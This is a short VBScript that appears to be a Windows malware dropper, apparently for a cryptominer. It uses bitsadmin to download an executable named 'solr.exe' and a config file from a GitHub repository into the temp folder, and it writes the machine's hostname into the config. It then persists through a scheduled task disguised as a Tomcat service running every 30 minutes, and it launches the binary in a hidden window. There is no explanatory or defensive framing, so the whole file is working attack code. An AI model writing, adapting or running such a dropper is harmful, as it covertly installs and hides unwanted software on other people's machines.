Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
Set colItems = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'solr.exe'")

If colItems.Count > 0 Then
    MsgBox "solr.exe is already running."
    WScript.Quit
End If

MsgBox "keep running"
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

strTempDir = objShell.ExpandEnvironmentStrings("%TEMP%")

strCacheDir = strTempDir & "\cache"
If Not objFSO.FolderExists(strCacheDir) Then
    objFSO.CreateFolder strCacheDir
End If

solrfile = strCacheDir & "\solr.exe"
If Not objFSO.FileExists(solrfile) Then
    objShell.Run "bitsadmin /transfer down https://github.com/lazy12121212/server/raw/main/solr.exe " & solrfile, 0, True
End If

configfile = strCacheDir & "\config.json"
If Not objFSO.FileExists(configfile) Then
    objShell.Run "bitsadmin /transfer down https://raw.githubusercontent.com/lazy12121212/server/main/config.json " & configfile, 0, True
End If

Set file = objFSO.OpenTextFile(configfile, 1)
configContent = file.ReadAll
file.Close

Set objRegEx = CreateObject("VBScript.RegExp")
objRegEx.Global = True
objRegEx.IgnoreCase = True
objRegEx.Pattern = """pass"": ""random"""

Set objMatch = objRegEx.Execute(configContent)
Set objExec = objShell.Exec("hostname")
random = Split(objExec.StdOut.ReadAll, vbCrLf)(0)
If random = "" Then
    random = "w-" & Right(String(12, "0") & Int((999999999999 - 100000000000 + 1) * Rnd + 100000000000), 12)
End If

configContent = objRegEx.Replace(configContent, """pass"": """ & Trim(random) & """")
Set file = objFSO.OpenTextFile(configfile, 2)
file.Write configContent
file.Close

objShell.Run "SchTasks.exe /Create /SC MINUTE /TN ""Tomcat service for Windows Service"" /TR " & solrfile & " /MO 30 /F", 0, True

objShell.Run solrfile, 0, True
